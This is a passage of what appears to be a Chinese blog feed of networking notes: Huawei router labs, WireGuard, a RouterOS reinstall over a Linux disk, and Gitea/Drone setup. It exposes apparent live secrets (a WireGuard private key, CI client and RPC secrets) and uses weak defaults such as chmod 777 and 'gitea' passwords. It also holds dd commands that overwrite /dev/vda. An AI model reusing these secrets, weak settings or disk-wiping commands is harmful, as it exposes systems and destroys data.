g0/0/1.30ospf enable area 0<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">静态路由</span>ip route-static 0.0.0.0 0 100.1.1.1<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">默认路由下放</span>ospfdefault-route-advertise<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">NAT</span>acl 2000rule permit source anyquitint g0/0/0nat outbound 2000language-shell复制代码</code></pre><h1 id="生成树-Spanning-tree-protocal"><a href="#生成树-Spanning-tree-protocal" class="headerlink" title="生成树 Spanning tree protocal"></a>生成树 Spanning tree protocal</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h3><ol><li>现网环境一般不会使用，一般默认设备会启动MSTP.</li><li>解决二层环路，MAC地址漂移。二层环路的原因是交换机尽力而为的</li></ol><h2 id="二层环路"><a href="#二层环路" class="headerlink" title="二层环路"></a>二层环路</h2><h2 id="STP的作用"><a href="#STP的作用" class="headerlink" title="STP的作用"></a>STP的作用</h2><h2 id="STP的运行原理"><a href="#STP的运行原理" class="headerlink" title="STP的运行原理"></a>STP的运行原理</h2><hr><p>s</p>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VLAN</title>
      <link href="/2024/01/27/VLAN/"/>
      <url>/2024/01/27/VLAN/</url>
      
        <content type="html"><![CDATA[<h3 id="VLAN"><a href="#VLAN" class="headerlink" title="VLAN"></a>VLAN</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/NetworkLab_004_VLAN.png" alt="img"></p><h4 id="1-SW1-和-SW2-的互联接口类型设置为-Trunk"><a href="#1-SW1-和-SW2-的互联接口类型设置为-Trunk" class="headerlink" title="1. SW1 和 SW2 的互联接口类型设置为 Trunk"></a>1. SW1 和 SW2 的互联接口类型设置为 Trunk</h4><pre><code class="hljs shell">[SW1] vlan batch 10 20[SW1] display vlan summary[SW1] int g0/0/0[SW1-g0/0/0] port link-type trunk[SW1-g0/0/0] port trunk allow-pass vlan 10 20language-shell复制代码</code></pre><h4 id="2-交换机接入-PC-终端的接口类型改为-access-并划分到相应-VLAN"><a href="#2-交换机接入-PC-终端的接口类型改为-access-并划分到相应-VLAN" class="headerlink" title="2. 交换机接入 PC 终端的接口类型改为 access 并划分到相应 VLAN"></a>2. 交换机接入 PC 终端的接口类型改为 access 并划分到相应 VLAN</h4><pre><code class="hljs shell">[SW1] int g0/0/1[SW1-g0/0/1] port link-type access[SW1-g0/0/1] port default vlan 10[SW1-g0/0/1] dis vlanlanguage-shell复制代码</code></pre><h4 id="3-相同-VLAN-的主机通信"><a href="#3-相同-VLAN-的主机通信" class="headerlink" title="3. 相同 VLAN 的主机通信"></a>3. 相同 VLAN 的主机通信</h4><pre><code class="hljs shell">ip 192.168.10.1 24ping 192.168.10.3language-shell复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>LLDP</title>
      <link href="/2024/01/27/LLDP/"/>
      <url>/2024/01/27/LLDP/</url>
      
        <content type="html"><![CDATA[<h3 id="LLDP"><a href="#LLDP" class="headerlink" title="LLDP"></a>LLDP</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/NetworkLab_003_LLDP.png" alt="LLDP"></p><p>LLDP</p><h4 id="1-路由器互联接口配置同网段-IP-地址"><a href="#1-路由器互联接口配置同网段-IP-地址" class="headerlink" title="1. 路由器互联接口配置同网段 IP 地址"></a>1. 路由器互联接口配置同网段 IP 地址</h4><pre><code class="hljs shell">[R1] int g0/0/0[R1-g0/0/0] ip add 12.1.1.1 24[R2] int g0/0/0[R2-g0/0/0] ip add 12.1.1.2 24language-shell复制代码</code></pre><h4 id="2-在系统视图下开启-LLDP"><a href="#2-在系统视图下开启-LLDP" class="headerlink" title="2. 在系统视图下开启 LLDP"></a>2. 在系统视图下开启 LLDP</h4><pre><code class="hljs shell">[R1] lldp enable[R2] lldp enablelanguage-shell复制代码</code></pre><h4 id="3-查看-LLDP-邻居信息"><a href="#3-查看-LLDP-邻居信息" class="headerlink" title="3. 查看 LLDP 邻居信息"></a>3. 查看 LLDP 邻居信息</h4><pre><code class="hljs shell">display lldp neighborlanguage-shell复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Telnet</title>
      <link href="/2024/01/27/Telnet/"/>
      <url>/2024/01/27/Telnet/</url>
      
        <content type="html"><![CDATA[<h3 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/NetworkLab_001_Telnet.png" alt="Telnet"></p><p>Telnet</p><h4 id="1-路由器互联接口配置同网段-IP-地址"><a href="#1-路由器互联接口配置同网段-IP-地址" class="headerlink" title="1. 路由器互联接口配置同网段 IP 地址"></a>1. 路由器互联接口配置同网段 IP 地址</h4><pre><code class="hljs shell">[R1] int g0/0/0[R1-g0/0/0] ip add 12.1.1.1 24[R2] int g0/0/0[R2-g0/0/0] ip add 12.1.1.2 24language-shell复制代码</code></pre><h4 id="2-在被登录设备上配置-Telnet"><a href="#2-在被登录设备上配置-Telnet" class="headerlink" title="2. 在被登录设备上配置 Telnet"></a>2. 在被登录设备上配置 Telnet</h4><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">配置 AAA 认证试图下，配置本地 Telnet 登录用户 hjxstart 和密码 HCIE</span>[R2] aaa[R2-aaa] local-user `hjxstart` privilege level `3` password cipher `HCIE`[R2-aaa] local-user `hjxstart` service-type `telnet`<span class="hljs-meta prompt_"># </span><span class="language-bash">在被登录设备上，开启 Telnet 服务器</span>[R2] `telnet` server enable<span class="hljs-meta prompt_"># </span><span class="language-bash">在被登录设备上，配置同一时间运行接入的虚拟终端数为 5</span>[R2] user-interface vty 0 4[R2-ui-vty0-4] authentication-mode aaalanguage-shell复制代码</code></pre><h4 id="3-在发起登录设备-AR1-上-telent-登录被登录设备-AR2"><a href="#3-在发起登录设备-AR1-上-telent-登录被登录设备-AR2" class="headerlink" title="3. 在发起登录设备 AR1 上 telent 登录被登录设备 AR2"></a>3. 在发起登录设备 AR1 上 telent 登录被登录设备 AR2</h4><pre><code class="hljs shell">&lt;R1&gt; telnet 12.1.1.2language-shell复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSH</title>
      <link href="/2024/01/27/SSH/"/>
      <url>/2024/01/27/SSH/</url>
      
        <content type="html"><![CDATA[<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/NetworkLab_002_SSH.png" alt="SSH"></p><p>SSH</p><h4 id="1-路由器互联接口配置同网段-IP-地址"><a href="#1-路由器互联接口配置同网段-IP-地址" class="headerlink" title="1. 路由器互联接口配置同网段 IP 地址"></a>1. 路由器互联接口配置同网段 IP 地址</h4><pre><code class="hljs shell">[R1] int g0/0/0[R1-g0/0/0] ip add 12.1.1.1 24[R2] int g0/0/0[R2-g0/0/0] ip add 12.1.1.2 24language-shell复制代码</code></pre><h4 id="2-在被登录设备上配置-SSH"><a href="#2-在被登录设备上配置-SSH" class="headerlink" title="2. 在被登录设备上配置 SSH"></a>2. 在被登录设备上配置 SSH</h4><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">配置 AAA 认证试图下，配置本地 SSH 登录用户 hjxstart 和密码 HCIE</span>[R2] aaa[R2-aaa] local-user `hjxstart` privilege level `15` password cipher `HCIE`[R2-aaa] local-user `hjxstart` service-type `ssh`<span class="hljs-meta prompt_"># </span><span class="language-bash">在被登录设备上，开启 SSH 服务器</span>[R2] `stelnet` server enable<span class="hljs-meta prompt_"># </span><span class="language-bash">创建本地公钥对， 输入: 1024</span>[R2] rsa local-key-pair create<span class="hljs-meta prompt_"># </span><span class="language-bash">在被登录设备上，配置同一时间运行接入的虚拟终端数为 5</span>[R2] user-interface vty 0 4[R2-ui-vty0-4] authentication-mode aaa<span class="hljs-meta prompt_"># </span><span class="language-bash">允许虚拟终端使用SSH协议</span>protocol inbound sshlanguage-shell复制代码</code></pre><h4 id="3-在发起登录设备-AR1-上-SSH-登录被登录设备-AR2"><a href="#3-在发起登录设备-AR1-上-SSH-登录被登录设备-AR2" class="headerlink" title="3. 在发起登录设备 AR1 上 SSH 登录被登录设备 AR2"></a>3. 在发起登录设备 AR1 上 SSH 登录被登录设备 AR2</h4><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">让R1第一时间成为SSH客户端</span>[R1] ssh client first-time enable<span class="hljs-meta prompt_"># </span><span class="language-bash">使用SSH登录R2，接受SSH公钥，和输入密码</span>[R1] stelnet 12.1.1.2language-shell复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WireGuard</title>
      <link href="/2023/12/22/WireGuard/"/>
      <url>/2023/12/22/WireGuard/</url>
      
        <content type="html"><![CDATA[<h1 id="WireGuard"><a href="#WireGuard" class="headerlink" title="WireGuard"></a>WireGuard</h1><h2 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h2><h2 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h2><h3 id="1-安装-wireguard-tools"><a href="#1-安装-wireguard-tools" class="headerlink" title="1.安装 wireguard-tools"></a>1.安装 wireguard-tools</h3><pre><code class="hljs shell">brew install wireguard-toolslanguage-shell复制代码</code></pre><h3 id="2-配置-wireguard-tools"><a href="#2-配置-wireguard-tools" class="headerlink" title="2.配置 wireguard-tools"></a>2.配置 wireguard-tools</h3><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建文件夹</span>sudo mkdir /etc/wireguard<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">设置文件夹权限</span>sudo chmod 777  /etc/wireguard<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">切入到创建的目录下</span>cd /etc/wireguard<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">生成公钥与私钥</span>wg genkey | tee privatekey | wg pubkey &gt; publickey<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">创建虚拟网卡配置文件</span>touch wg0.conf<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">编辑虚拟网卡配置文件内容</span>vi wg0.conflanguage-shell复制代码</code></pre><h3 id="3-wg0-conf-虚拟网卡配置"><a href="#3-wg0-conf-虚拟网卡配置" class="headerlink" title="3.wg0.conf 虚拟网卡配置"></a>3.wg0.conf 虚拟网卡配置</h3><pre><code class="hljs shell">[Interface]Address = 192.168.XX.20/24PrivateKey = 客户端的私钥 (privatekey)DNS = 192.168.XX.1[Peer]PublicKey = 服务端的公钥Endpoint = 服务器公网IP:13231AllowedIPs = 0.0.0.0/0PersistentKeepalive = 30language-shell复制代码</code></pre><h3 id="4-相关命令"><a href="#4-相关命令" class="headerlink" title="4.相关命令"></a>4.相关命令</h3><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">启动网卡</span>wg-quick up wg0<span class="hljs-meta prompt_"># </span><span class="language-bash">停止服务</span>wg-quick down wg0<span class="hljs-meta prompt_"># </span><span class="language-bash">查看配置</span>wg-quick strip wg0language-shell复制代码[Interface]PrivateKey = cOVbYQzoRcUsr31GtEV1rKgO9FK2vohF6WWy72R11l0=Address = 192.168.44.11/32DNS = 192.168.14.1[Peer]PublicKey = RGClYhAev1eJKKzlAMBWhh2N4LP4hLTuEMrurLl8j0w=AllowedIPs = 1.0.0.0/8, 2.0.0.0/8, 3.0.0.0/8, 4.0.0.0/6, 8.0.0.0/7, 11.0.0.0/8, 12.0.0.0/6, 16.0.0.0/4, 32.0.0.0/3, 64.0.0.0/2, 128.0.0.0/3, 160.0.0.0/5, 168.0.0.0/6, 172.0.0.0/12, 172.32.0.0/11, 172.64.0.0/10, 172.128.0.0/9, 173.0.0.0/8, 174.0.0.0/7, 176.0.0.0/4, 192.0.0.0/9, 192.128.0.0/11, 192.160.0.0/13, 192.169.0.0/16, 192.170.0.0/15, 192.172.0.0/14, 192.176.0.0/12, 192.192.0.0/10, 193.0.0.0/8, 194.0.0.0/7, 196.0.0.0/6, 200.0.0.0/5, 208.0.0.0/4, 192.168.14.1/32Endpoint = ros.huangfamily.cn:40044PersistentKeepalive = 30</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Stack Port</title>
      <link href="/2023/12/21/Stack-Port/"/>
      <url>/2023/12/21/Stack-Port/</url>
      
        <content type="html"><![CDATA[<h1 id="堆叠介绍"><a href="#堆叠介绍" class="headerlink" title="堆叠介绍"></a>堆叠介绍</h1><p>SW1</p><pre><code class="hljs shell">1. 修改接口```bash interface stack-port 0/1 language-shell复制代码</code></pre><ol><li>优先级，默认是1，shutdown接口</li><li>堆叠接口你</li><li>no shutdown 接口</li><li>激活接口</li></ol><pre><code class="hljs">主，备，从复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>RouterOS</title>
      <link href="/2023/12/18/RouterOS/"/>
      <url>/2023/12/18/RouterOS/</url>
      
        <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="Centos7-6-minimal安装ROS"><a href="#Centos7-6-minimal安装ROS" class="headerlink" title="Centos7.6 minimal安装ROS"></a>Centos7.6 minimal安装ROS</h2><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250404102000.png" alt="下载"></p><p>下载</p><pre><code class="hljs bash">yum -y install unzip<span class="hljs-comment"># 在线下载ROM执行</span>wget https://download.mikrotik.com/routeros/7.18.2/chr-7.18.2.img.zip<span class="hljs-comment"># 解压</span>unzip chr-7.18.2.img.zip<span class="hljs-comment"># 将镜像挂载到 /mnt</span>mount -o loop,offset=512 chr-7.18.2.img /mnt<span class="hljs-comment"># 执行 ip a 后确认打印的结果第二项为后依次执行以下命令</span>ADDR0=`ip addr show eth0 | grep global | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f 6 | <span class="hljs-built_in">head</span> -n 1`GATE0=`ip route list | grep default | <span class="hljs-built_in">cut</span> -d<span class="hljs-string">&#x27; &#x27;</span> -f 3`<span class="hljs-comment"># 以在镜像中创建配置内容。</span><span class="hljs-built_in">mkdir</span> -p /mnt/rw<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/ip address add address=<span class="hljs-variable">$ADDR0</span> interface=[/interface ethernet find where name=eth0]</span><span class="hljs-string">/ip route add gateway=<span class="hljs-variable">$GATE0</span></span><span class="hljs-string">&quot;</span> &gt; /mnt/rw/autorun.scr<span class="hljs-comment"># 刷入镜像</span>umount /mnt<span class="hljs-comment"># 将文件系统设定为只读 (Read only)，执行</span><span class="hljs-built_in">echo</span> u &gt; /proc/sysrq-triggerfdisk -lu<span class="hljs-comment"># 执行dd写入重启</span><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=chr-7.18.2.img bs=1024 of=/dev/vda &amp;&amp; reboot</code></pre><h2 id="Ubuntu18-04安装ROS-可选"><a href="#Ubuntu18-04安装ROS-可选" class="headerlink" title="Ubuntu18.04安装ROS[可选]"></a>Ubuntu18.04安装ROS[可选]</h2><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><blockquote><p>此文档使用的Ubuntu系统版本是16.04或者18.04<br>Ubuntu系统只挂载了一个磁盘, 磁盘20G以上空间即可，多了浪费<br>此文档使用的Ubuntu系统的网卡是自动获取IP地址</p></blockquote><h3 id="下载MikroTik的CHR版本镜像"><a href="#下载MikroTik的CHR版本镜像" class="headerlink" title="下载MikroTik的CHR版本镜像"></a>下载MikroTik的CHR版本镜像</h3><pre><code class="hljs bash"><span class="hljs-comment"># 更新存储库，并下载wget和unzip程序</span>apt update  &amp;&amp; apt install -y wget unzip<span class="hljs-comment"># 下载CHR镜像</span>wget https://download.mikrotik.com/routeros/7.18.1/chr-7.18.1.img.zip<span class="hljs-comment"># 解压CHR镜像</span>gunzip -c chr-7.18.1.img.zip &gt; chr.img</code></pre><h3 id="挂载镜像"><a href="#挂载镜像" class="headerlink" title="挂载镜像"></a>挂载镜像</h3><pre><code class="hljs bash"><span class="hljs-comment"># 安装kpartx</span>apt-get install kpartx<span class="hljs-comment"># 挂载镜像</span>kpartx -av chr.imgmount -o loop /dev/mapper/loop0p1 /mnt</code></pre><h3 id="卸载镜像"><a href="#卸载镜像" class="headerlink" title="卸载镜像"></a>卸载镜像</h3><pre><code class="hljs bash">umount /mntkpartx -dv /dev/loop0losetup -d /dev/loop0</code></pre><h3 id="查看Ubuntu系统的盘符标识"><a href="#查看Ubuntu系统的盘符标识" class="headerlink" title="查看Ubuntu系统的盘符标识"></a>查看Ubuntu系统的盘符标识</h3><pre><code class="hljs bash"><span class="hljs-comment"># Ubuntu系统挂载为只读</span><span class="hljs-built_in">echo</span> u &gt; /proc/sysrq-trigger<span class="hljs-comment"># 替换Ubuntu系统为MikroTik系统 lsblk</span><span class="hljs-comment"># 注意替换vda为实际的盘符标识</span><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=chr.img bs=1024 of=/dev/vda<span class="hljs-comment"># 重启系统</span><span class="hljs-built_in">echo</span> s &gt; /proc/sysrq-trigger &amp;&amp; <span class="hljs-built_in">sleep</span> 5 &amp;&amp; <span class="hljs-built_in">echo</span> b &gt; /proc/sysrq-trigger</code></pre><hr><h2 id="ESXI-创建ROS"><a href="#ESXI-创建ROS" class="headerlink" title="ESXI 创建ROS"></a>ESXI 创建ROS</h2><h3 id="创建-ROS-虚拟机"><a href="#创建-ROS-虚拟机" class="headerlink" title="创建 ROS 虚拟机"></a>创建 ROS 虚拟机</h3><ol><li>创建虚拟机名字和选择 Linux 类型</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/Ros_create_1.png" alt="img"></p><ol><li>修改虚拟机的配置，锁定内存和添加直通网卡</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/ROS_Create_2.png" alt="img"></p><ol><li>修改为 BIOS 引导启动</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/ROS_Create_3.png" alt="img"></p><ol><li>添加一块现有的 ROS 的 VMDK 硬盘</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203140802.png" alt="img"></p><ol><li>修改硬盘大小和类型</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203140955.png" alt="img"></p><ol><li>使用 WinBox 工具的 Neighbors 选择，以 admin 空密码的方式连接到 ROS，首次登录建议修改密码</li></ol><h3 id="配置-ROS"><a href="#配置-ROS" class="headerlink" title="配置 ROS"></a>配置 ROS</h3><ol><li>修改接口名字。通过插拔网线的方式，双击网卡重命名实际网卡的名称</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203141929.png" alt="img"></p><ol><li>创建网桥。将多个 LAN 口连接起来。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203142157.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203142344.png" alt="img"></p><ol><li>添加 ROS 的 IP 地址。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203142721.png" alt="img"></p><ol><li>WAN 口获取地址. 添加 DNS 客户端</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203143132.png" alt="img"></p><ol><li>添加 DNS</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203143527.png" alt="img"></p><ol><li>设置 NAT。打开防火墙</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203143946.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20240203144044.png" alt="img"></p><ol><li>激活 License</li><li>设置开机自启动</li></ol><pre><code class="hljs bash">/interface/veth/add name=veth2 address=172.17.0.2 gateway=172.17.0.1/interface/bridge/port add bridge=bridge interface=veth2/container/config/set registry-url=https://registry-1.docker.io/container mounts add dst=/var/log/nginx/ name=nginxlog src=”/disk1/nginx”/container/add remote-image=nginx:latest interface=veth2 root-dir=disk1/nginx mounts=nginxlog logging=<span class="hljs-built_in">yes</span></code></pre><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><pre><code class="hljs bash">/ip service <span class="hljs-built_in">set</span> 0,1,2,4,5,7 <span class="hljs-built_in">disable</span>=<span class="hljs-built_in">yes</span></code></pre><h2 id="Wireguard"><a href="#Wireguard" class="headerlink" title="Wireguard"></a>Wireguard</h2><h3 id="Allowed-Address"><a href="#Allowed-Address" class="headerlink" title="Allowed Address"></a>Allowed Address</h3><pre><code class="hljs bash"><span class="hljs-comment"># 是目的地址</span><span class="hljs-comment"># 最少要配置对端的IP地址</span>gateway=192.168.44.1%wireguard1 <span class="hljs-comment"># 这样就不用递归路由了</span><span class="hljs-comment"># 点对多点</span>在所有peer中，allowed Address不可以重叠，（相当于有2条或者多条相同优先级的路由）</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GIT</title>
      <link href="/2023/12/18/Git/"/>
      <url>/2023/12/18/Git/</url>
      
        <content type="html"><![CDATA[<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><h3 id="配置Git"><a href="#配置Git" class="headerlink" title="配置Git"></a>配置Git</h3><pre><code class="hljs shell">git config --global user.name &quot;hjxstart&quot;git config --global user.email &quot;hjxstart@gmail.com&quot;ssh-keygen -t ed25519 -C &quot;hjxstart@gmail.com&quot;language-shell复制代码</code></pre><hr><h1 id="Gitea"><a href="#Gitea" class="headerlink" title="Gitea"></a>Gitea</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><blockquote><p>官方参考<a href="https://docs.gitea.io/zh-cn/install-with-docker/#ssh-%E5%AE%B9%E5%99%A8%E7%9B%B4%E9%80%9A">链接</a></p></blockquote><h3 id="前期配置"><a href="#前期配置" class="headerlink" title="前期配置"></a>前期配置</h3><ol><li>创建 git 用户并且指定 uid 和 gid</li></ol><pre><code class="hljs bash">gruopadd git -g 1000useradd git -u 1000 -g 1000</code></pre><ol><li>将 git 用户百年规定 git 组的某个文件</li></ol><pre><code class="hljs shell">chown -R git:git /app/gitea/gitealanguage-shell复制代码</code></pre><ol><li>创建&#x2F;app&#x2F;gitea&#x2F;gitea 文件</li></ol><pre><code class="hljs shell">ssh -p 4002 -o StrictHostKeyChecking=no git@127.0.0.1 &quot;SSH_ORIGINAL_COMMAND=\&quot;$SSH_ORIGINAL_COMMAND\&quot; $0 $@&quot;language-shell复制代码</code></pre><h3 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h3><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&quot;3&quot;</span><span class="hljs-attr">networks:</span>  <span class="hljs-attr">gitea:</span>    <span class="hljs-attr">external:</span> <span class="hljs-literal">false</span><span class="hljs-attr">services:</span>  <span class="hljs-attr">server:</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">gitea/gitea:1.15.7</span>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">gitea</span>    <span class="hljs-attr">environment:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">USER_UID=1000</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">USER_GID=1000</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_TYPE=mysql</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_HOST=db:3306</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_NAME=gitea</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_USER=gitea</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DB_PASSWD=gitea</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DOMAIN=git.huangfamily.cn</span>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>    <span class="hljs-attr">networks:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">gitea</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./gitea:/data</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/timezone:/etc/timezone:ro</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/localtime:/etc/localtime:ro</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">/home/git/.ssh/:/data/git/.ssh</span>    <span class="hljs-attr">ports:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;4001:3000&quot;</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;4002:22&quot;</span>    <span class="hljs-attr">depends_on:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">db</span>  <span class="hljs-attr">db:</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">mysql:8</span>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>    <span class="hljs-attr">security_opt:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">seccomp:unconfined</span>    <span class="hljs-attr">environment:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_ROOT_PASSWORD=gitea</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_USER=gitea</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_PASSWORD=gitea</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_DATABASE=gitea</span>    <span class="hljs-attr">networks:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">gitea</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">./mysql:/var/lib/mysql</span><span class="hljs-string">language-yaml复制代码</span></code></pre><h2 id="整合-Drone-CI"><a href="#整合-Drone-CI" class="headerlink" title="整合 Drone CI"></a>整合 Drone CI</h2><blockquote><p>基于 Gitea 和 Drone 的轻量级的 CI 解决方案。</p></blockquote><h3 id="安装配置-1"><a href="#安装配置-1" class="headerlink" title="安装配置"></a>安装配置</h3><pre><code class="hljs yml"><span class="hljs-attr">services:</span>  <span class="hljs-attr">drone-server:</span>    <span class="hljs-attr">container_name:</span> <span class="hljs-string">drone-server</span>    <span class="hljs-attr">image:</span> <span class="hljs-string">drone/drone:latest</span>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span>    <span class="hljs-attr">environment:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_GITEA=true</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_GITEA_SERVER=http://192.168.18.241:3000</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_GITEA_CLIENT_ID=569bfde3-640d-417c-a3eb-58f5065c2b07</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_GITEA_CLIENT_SECRET=IWz8rOOIzTclkg2oNYfFxpprtGbfhSWxum8nESpWS0Qp</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_GIT_ALWAYS_AUTH=true</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_GITEA_SKIP_VERIFY=true</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RUNNER_CAPACITY=2</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_SERVER_PROTO=http</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_SERVER_HOST=192.168.18.241:7890</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_NETWORK=cicd_default</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RUNNER_NETWORKS=cicd_default</span>      <span class="hljs-comment"># 这个密钥是给runner用的</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_RPC_SECRET=07d3caaa3e2d2d33bc1ce18c60d43213</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_AGENTS_ENABLED=true</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">SET_CONTAINER_TIMEZONE=true</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">CONTAINER_TIMEZONE=Asia/Shanghai</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">DRONE_USER_CREATE=username:test_admin,admin:true</span>    <span class="hljs-attr">ports:</span>      <span class="hljs-comment"># 控制台页面端口</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;7890:80&quot;</span>    <span class="hljs-comment">#   - 9000:9000</span>    <span class="hljs-attr">volumes:</span>      <span class="hljs-bullet">-</span> <span class="hljs-string">/etc/timezone:/etc/timezone</span>      <span 